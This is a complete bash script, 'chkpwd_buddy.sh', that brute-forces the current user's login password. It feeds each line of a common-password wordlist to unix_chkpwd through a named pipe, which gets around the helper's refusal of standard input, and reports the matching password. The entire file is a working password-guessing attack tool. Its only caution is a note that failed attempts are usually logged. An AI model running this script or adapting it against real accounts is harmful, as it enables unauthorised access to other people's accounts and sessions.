#!/bin/bash

# --------------------------------------------------------------------
#
# chkpwd_buddy.sh
# Ver. 0.1
#
# Bash script that tries to discover current user password,
# by brute-forcing it using a list of common passwords.
# It checks all the list's passwords using unix_chkpwd
# (the same PAM component used by pam_unix, which, in turn,
# is used by login, xscreensaver etc.).
#
# Beware: most systems will log all the failed password checks.
#
# Author: Marco Bellaccini - marco.bellaccini[at!]gmail.com
#
# License:
# Creative Commons CC0 1.0
# https://creativecommons.org/publicdomain/zero/1.0/legalcode
#
# --------------------------------------------------------------------

# name for the temporary named-pipe
TMPFIFO=/tmp/tmpfifobuddy

# unix_chkpwd path
CHKPWDPATH=/sbin/unix_chkpwd

# success return code
E_SUCCESS=0

# wrong args number return code
E_WRONGARGS=85

# error creating named-pipe return code
E_ERRMKFIFO=86

# error reading password list return code
E_ERRPLIST=87

# password not in the list return code
E_NOTINLIST=100

# SIGINT return code
E_SIGINT=130

# SIGTERM return code
E_SIGTERM=143

# check arguments number
if [ $# -ne 1 ]
then
	echo "Usage example: `basename $0` passwlist.txt"
	exit $E_WRONGARGS;
fi

# get password list as argument
LIST="$1"

# create named-pipe
mkfifo $TMPFIFO

# check if pipe was created successfully
if [ "$?" -ne "0" ]
then
	echo "ERROR: cannot create named pipe."
	exit $E_ERRMKFIFO;
fi

# catch SIGINT and SIGTERM to delete named pipe before exiting
trap "{ echo \"Quitting...\"; rm $TMPFIFO; exit $E_SIGINT; }" SIGINT
trap "{ echo \"Quitting...\"; rm $TMPFIFO; exit $E_SIGTERM; }" SIGTERM

# check if password list file exists and is readable
if [ ! -f "$LIST" ] || [ ! -r "$LIST" ]
then
	echo "ERROR: cannot open password list file \"$LIST\"."
	rm $TMPFIFO
	exit $E_ERRPLIST;
fi

# read password list file
while read line
do
	# write the password to the pipe, followed by a null character
	echo -ne "$line\0" > $TMPFIFO &

	# pass the password to unix_chkpwd using the pipe
	# note: we can't use the standard streams because unix_chkpwd
	# forbids it
	$CHKPWDPATH $USER nullok < $TMPFIFO

	# if unix_chkpwd returns success
	if [ "$?" -eq "0" ]
	then
		echo "SUCCESS: $USER password is \"$line\" (and is in \"$LIST\")!"
		# delete named pipe
		rm $TMPFIFO
		# exit success
		exit $E_SUCCESS;
	fi

done < "$LIST"

# here we reached the end of the list
# hence, user's password is not in the list
echo "FAILURE: $USER password is not in the list \"$LIST\"."

# delete named pipe
rm $TMPFIFO
# exit success
exit $E_NOTINLIST;
